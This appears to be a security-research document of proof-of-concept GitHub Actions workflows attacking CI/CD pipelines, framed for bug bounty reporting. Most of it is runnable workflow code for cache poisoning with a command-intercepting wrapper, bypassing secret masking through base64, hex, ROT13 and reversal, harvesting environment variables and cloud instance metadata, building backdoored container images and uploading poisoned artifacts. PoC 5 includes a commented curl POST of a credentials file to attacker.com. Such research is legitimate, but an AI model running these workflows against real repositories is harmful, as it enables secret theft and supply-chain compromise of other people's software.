# Proof of Concept Workflows for Vulnerability Chains

This document contains proof-of-concept GitHub Actions workflows that demonstrate the identified vulnerability chains.

**⚠️ WARNING: These workflows are for security research purposes only. Do not use in production or against systems you don't own.**

---

## PoC 1: Cache Poisoning Attack

This demonstrates how an attacker can poison the GitHub Actions cache to persist malicious code across workflow runs.

### Attacker Workflow (Stage 1: Poison Cache)

```yaml
name: PoC - Cache Poisoning (Stage 1)
on:
  workflow_dispatch:

jobs:
  poison-cache:
    runs-on: ubuntu-latest
    steps:
      - name: Create malicious cached tool
        run: |
          mkdir -p ~/.local/bin
          cat > ~/.local/bin/wrapper << 'EOF'
          #!/bin/bash
          # Malicious wrapper that intercepts commands
          echo "[!] Intercepted command: $@"
          
          # Log environment variables (for demonstration)
          echo "[!] Environment snapshot:"
          env | grep -E "GITHUB_|RUNNER_" | head -5
          
          # Execute original command
          exec "$@"
          EOF
          chmod +x ~/.local/bin/wrapper
          
      - name: Cache the poisoned tool
        uses: actions/cache@v3
        with:
          path: ~/.local/bin
          key: build-tools-${{ runner.os }}-v1
          
      - name: Verify cache created
        run: |
          echo "✓ Malicious cache entry created"
          echo "  Key: build-tools-${{ runner.os }}-v1"
          echo "  Contents: ~/.local/bin/wrapper"
```

### Victim Workflow (Stage 2: Use Poisoned Cache)

```yaml
name: PoC - Cache Poisoning (Stage 2)
on:
  workflow_dispatch:

jobs:
  use-cache:
    runs-on: ubuntu-latest
    steps:
      - name: Restore cache (poisoned)
        uses: actions/cache@v3
        with:
          path: ~/.local/bin
          key: build-tools-${{ runner.os }}-v1
          
      - name: Use cached tool
        run: |
          # Add cached tools to PATH
          export PATH=~/.local/bin:$PATH
          
          # Now any command will be intercepted
          echo "Running build..."
          # In real scenario: npm install, npm run build, etc.
          # These would all be wrapped by the malicious script
          
      - name: Check if compromised
        run: |
          if [ -f ~/.local/bin/wrapper ]; then
            echo "⚠️  VULNERABLE: Malicious wrapper found from cache"
            cat ~/.local/bin/wrapper
          else
            echo "✓ Not vulnerable"
          fi
```

---

## PoC 2: Secret Exfiltration via Encoding

This demonstrates bypassing GitHub's secret masking using various encoding techniques.

```yaml
name: PoC - Secret Exfiltration
on:
  workflow_dispatch:

jobs:
  exfiltrate-demo:
    runs-on: ubuntu-latest
    steps:
      - name: Create test secret
        run: |
          # Using a test value instead of real secret
          export TEST_SECRET="test-token-123456789"
          echo "TEST_SECRET=$TEST_SECRET" >> $GITHUB_ENV
          
      - name: Attempt 1 - Direct echo (will be masked)
        run: |
          echo "Direct: ${{ env.TEST_SECRET }}"
          # GitHub will mask this in logs
          
      - name: Attempt 2 - Base64 encoding (bypasses masking)
        run: |
          ENCODED=$(echo "${{ env.TEST_SECRET }}" | base64)
          echo "Encoded: $ENCODED"
          # This will appear in logs unmasked
          
      - name: Attempt 3 - Hex encoding (bypasses masking)
        run: |
          HEX=$(echo "${{ env.TEST_SECRET }}" | xxd -p | tr -d '\n')
          echo "Hex: $HEX"
          # This will appear in logs unmasked
          
      - name: Attempt 4 - Character splitting (bypasses masking)
        run: |
          SPLIT=$(echo "${{ env.TEST_SECRET }}" | sed 's/./& /g')
          echo "Split: $SPLIT"
          # This will appear in logs unmasked
          
      - name: Attempt 5 - ROT13 encoding (bypasses masking)
        run: |
          ROT13=$(echo "${{ env.TEST_SECRET }}" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
          echo "ROT13: $ROT13"
          # This will appear in logs unmasked
          
      - name: Attempt 6 - Reverse string (bypasses masking)
        run: |
          REVERSED=$(echo "${{ env.TEST_SECRET }}" | rev)
          echo "Reversed: $REVERSED"
          # This will appear in logs unmasked
```

---

## PoC 3: Data Exfiltration via Git Commits

This demonstrates exfiltrating data through Git commits to an attacker-controlled repository.

```yaml
name: PoC - Data Exfiltration via Git
on:
  workflow_dispatch:

jobs:
  exfiltrate-via-git:
    runs-on: ubuntu-latest
    steps:
      - name: Setup exfiltration repository
        run: |
          # In real attack, this would be attacker's repo
          # For PoC, we'll simulate locally
          mkdir -p /tmp/exfil-repo
          cd /tmp/exfil-repo
          git init
          git config user.email "poc@example.com"
          git config user.name "PoC User"
          
      - name: Collect sensitive data
        run: |
          cd /tmp/exfil-repo
          
          # Collect system information
          echo "=== System Info ===" > collected-data.txt
          uname -a >> collected-data.txt
          
          # Collect environment variables
          echo "" >> collected-data.txt
          echo "=== Environment ===" >> collected-data.txt
          env | grep -E "GITHUB_|RUNNER_" >> collected-data.txt
          
          # Collect Docker info
          echo "" >> collected-data.txt
          echo "=== Docker Info ===" >> collected-data.txt
          docker info >> collected-data.txt 2>&1
          
          # Collect IMDS metadata
          echo "" >> collected-data.txt
          echo "=== IMDS Metadata ===" >> collected-data.txt
          curl -s -H "Metadata:true" \
            "http://168.63.129.16/metadata/instance?api-version=2021-02-01" \
            >> collected-data.txt 2>&1 || echo "IMDS not available"
          
      - name: Exfiltrate via commit
        run: |
          cd /tmp/exfil-repo
          git add collected-data.txt
          git commit -m "Collected data from $(date)"
          
          # In real attack, would push to attacker's repo:
          # git remote add origin https://github.com/attacker/exfil.git
          # git push origin main
          
          echo "✓ Data prepared for exfiltration"
          echo "  In real attack, this would be pushed to attacker's repo"
          
      - name: Show exfiltrated data
        run: |
          echo "=== Exfiltrated Data Preview ==="
          cat /tmp/exfil-repo/collected-data.txt | head -50
```

---

## PoC 4: Container Image Poisoning

This demonstrates poisoning a container image that could be used by other workflows.

```yaml
name: PoC - Image Poisoning
on:
  workflow_dispatch:

jobs:
  poison-image:
    runs-on: ubuntu-latest
    steps:
      - name: Create malicious Dockerfile
        run: |
          cat > Dockerfile << 'EOF'
          FROM ubuntu:latest
          
          # Install backdoor script
          RUN cat > /usr/local/bin/backdoor.sh << 'SCRIPT'
          #!/bin/bash
          echo "[!] Backdoor activated in container"
          
          # Collect secrets if available
          if [ -n "$GITHUB_TOKEN" ]; then
            echo "[!] GitHub token found: ${GITHUB_TOKEN:0:10}..."
          fi
          
          # Log environment
          echo "[!] Environment variables:"
          env | grep -E "GITHUB_|NPM_|AWS_|DOCKER_" || true
          
          # Execute original entrypoint if provided
          if [ $# -gt 0 ]; then
            exec "$@"
          fi
          SCRIPT
          
          RUN chmod +x /usr/local/bin/backdoor.sh
          
          # Set as entrypoint
          ENTRYPOINT ["/usr/local/bin/backdoor.sh"]
          CMD ["/bin/bash"]
          EOF
          
      - name: Build malicious image
        run: |
          docker build -t poisoned-app:latest .
          
      - name: Test malicious image
        run: |
          echo "Testing poisoned image..."
          docker run --rm poisoned-app:latest echo "Container started"
          
      - name: Demonstrate persistence
        run: |
          echo "✓ Malicious image built successfully"
          echo "  Image: poisoned-app:latest"
          echo ""
          echo "In real attack scenario:"
          echo "  1. Push to ghcr.io/victim-org/app:latest"
          echo "  2. Other workflows pull and use poisoned image"
          echo "  3. Backdoor executes in all workflows using the image"
          echo ""
          echo "Impact:"
          echo "  • Cross-workflow persistence"
          echo "  • Multi-repository compromise"
          echo "  • Secret harvesting from all workflows"
```

---

## PoC 5: Artifact Poisoning

This demonstrates poisoning workflow artifacts that could be used in deployment pipelines.

```yaml
name: PoC - Artifact Poisoning
on:
  workflow_dispatch:

jobs:
  poison-artifact:
    runs-on: ubuntu-latest
    steps:
      - name: Create malicious artifact
        run: |
          mkdir -p build-output
          
          # Create a malicious executable
          cat > build-output/app.sh << 'EOF'
          #!/bin/bash
          echo "[!] Executing poisoned artifact"
          
          # Backdoor logic
          if [ -f /etc/secret-credentials ]; then
            echo "[!] Found credentials, exfiltrating..."
            # In real attack: curl -X POST https://attacker.com/exfil -d @/etc/secret-credentials
          fi
          
          # Pretend to be legitimate app
          echo "Application started successfully"
          EOF
          
          chmod +x build-output/app.sh
          
      - name: Upload poisoned artifact
        uses: actions/upload-artifact@v3
        with:
          name: build-output
          path: build-output/
          
      - name: Summary
        run: |
          echo "✓ Poisoned artifact uploaded"
          echo ""
          echo "Attack scenario:"
          echo "  1. Malicious build workflow uploads poisoned artifact"
          echo "  2. Deployment workflow downloads artifact"
          echo "  3. Artifact is deployed to production"
          echo "  4. Backdoor executes in production environment"
          echo ""
          echo "Impact:"
          echo "  • Supply chain compromise"
          echo "  • Production deployment of malicious code"
          echo "  • Credential theft in production"
          
  use-artifact:
    runs-on: ubuntu-latest
    needs: poison-artifact
    steps:
      - name: Download artifact
        uses: actions/download-artifact@v3
        with:
          name: build-output
          
      - name: Verify compromise
        run: |
          echo "Checking downloaded artifact..."
          if [ -f app.sh ]; then
            echo "⚠️  VULNERABLE: Malicious artifact downloaded"
            echo ""
            echo "Artifact contents:"
            cat app.sh
            echo ""
            echo "This would be executed in deployment pipeline"
          fi
```

---

## PoC 6: Combined Attack - Full Supply Chain Compromise

This demonstrates a complete attack chain combining multiple techniques.

```yaml
name: PoC - Combined Supply Chain Attack
on:
  workflow_dispatch:

jobs:
  stage-1-reconnaissance:
    runs-on: ubuntu-latest
    steps:
      - name: Gather intelligence
        run: |
          echo "=== Stage 1: Reconnaissance ==="
          
          # Check available capabilities
          echo "Docker: $(docker --version)"
          echo "Git: $(git --version)"
          echo "Sudo: $(sudo -n true && echo 'Available' || echo 'Not available')"
          
          # Check network access
          echo "GitHub API: $(curl -s -o /dev/null -w '%{http_code}' https://api.github.com)"
          
          # Check IMDS
          echo "IMDS: $(curl -s -H 'Metadata:true' --max-time 2 \
            'http://168.63.129.16/metadata/instance?api-version=2021-02-01' \
            > /dev/null 2>&1 && echo 'Available' || echo 'Not available')"
          
  stage-2-poison-cache:
    runs-on: ubuntu-latest
    needs: stage-1-reconnaissance
    steps:
      - name: Create persistent backdoor
        run: |
          echo "=== Stage 2: Cache Poisoning ==="
          mkdir -p ~/.npm-global/bin
          
          # Create malicious npm wrapper
          cat > ~/.npm-global/bin/npm << 'EOF'
          #!/bin/bash
          # Intercept npm commands
          if [[ "$*" == *"publish"* ]]; then
            echo "[!] Intercepting npm publish"
            # Inject malicious code into package
          fi
          /usr/bin/npm "$@"
          EOF
          chmod +x ~/.npm-global/bin/npm
          
      - name: Cache backdoor
        uses: actions/cache@v3
        with:
          path: ~/.npm-global
          key: npm-tools-${{ runner.os }}-v1
          
  stage-3-poison-image:
    runs-on: ubuntu-latest
    needs: stage-2-poison-cache
    steps:
      - name: Build trojan image
        run: |
          echo "=== Stage 3: Image Poisoning ==="
          cat > Dockerfile << 'EOF'
          FROM node:18
          RUN echo 'console.log("Backdoor loaded");' > /backdoor.js
          CMD ["node", "/backdoor.js"]
          EOF
          docker build -t supply-chain-poc:latest .
          
  stage-4-exfiltrate:
    runs-on: ubuntu-latest
    needs: stage-3-poison-image
    steps:
      - name: Prepare exfiltration
        run: |
          echo "=== Stage 4: Data Exfiltration ==="
          mkdir -p /tmp/exfil
          
          # Collect valuable data
          env | grep -E "GITHUB_|NPM_" > /tmp/exfil/secrets.txt
          docker info > /tmp/exfil/docker.txt
          
          echo "✓ Data collected and ready for exfiltration"
          echo "  In real attack: Push to attacker's git repository"
          
  stage-5-summary:
    runs-on: ubuntu-latest
    needs: stage-4-exfiltrate
    steps:
      - name: Attack summary
        run: |
          echo "================================================"
          echo "Supply Chain Attack Demonstration Complete"
          echo "================================================"
          echo ""
          echo "Stages executed:"
          echo "  ✓ Stage 1: Reconnaissance"
          echo "  ✓ Stage 2: Cache poisoning"
          echo "  ✓ Stage 3: Image poisoning"
          echo "  ✓ Stage 4: Data exfiltration"
          echo ""
          echo "Attack capabilities demonstrated:"
          echo "  • Persistence across workflow runs"
          echo "  • Multiple infection vectors"
          echo "  • Data exfiltration channels"
          echo "  • Cross-workflow compromise potential"
          echo ""
          echo "Mitigation recommendations:"
          echo "  1. Implement cache integrity verification"
          echo "  2. Scan container images for malicious content"
          echo "  3. Restrict artifact download permissions"
          echo "  4. Enhanced log monitoring for encoding patterns"
          echo "  5. Network egress monitoring and restrictions"
```

---

## Testing Instructions

### Prerequisites
- GitHub repository with Actions enabled
- Appropriate permissions to run workflows
- Understanding of responsible disclosure

### Running the PoCs

1. **Create workflow files**: Copy each PoC into `.github/workflows/` directory
2. **Trigger manually**: Use workflow_dispatch to run each PoC
3. **Review logs**: Check Actions logs for demonstration output
4. **Verify impact**: Confirm that techniques work as described

### Safety Notes

⚠️ **IMPORTANT**:
- These PoCs are for **security research only**
- Run only in **test repositories you control**
- Do not use real secrets or credentials
- Do not exfiltrate actual sensitive data
- Follow responsible disclosure practices

### Expected Results

| PoC | Expected Outcome |
|-----|-----------------|
| Cache Poisoning | Malicious tools persist across runs |
| Secret Exfiltration | Encoded secrets appear in logs |
| Git Exfiltration | Data collected and prepared for push |
| Image Poisoning | Backdoored container created |
| Artifact Poisoning | Malicious artifact uploaded/downloaded |
| Combined Attack | All stages execute successfully |

---

## Reporting to Bug Bounty

If these PoCs demonstrate exploitable vulnerabilities, prepare a bug bounty report with:

1. **Title**: Clear, descriptive vulnerability title
2. **Severity**: Based on CVSS score and impact
3. **Description**: Detailed explanation of the vulnerability chain
4. **Proof of Concept**: Working demonstration (these workflows)
5. **Impact**: Real-world exploitation scenarios
6. **Remediation**: Suggested fixes

**GitHub Security Bug Bounty**: https://bounty.github.com/

---

**Disclaimer**: This document is for authorized security research only. Unauthorized testing against systems you don't own is illegal and unethical.
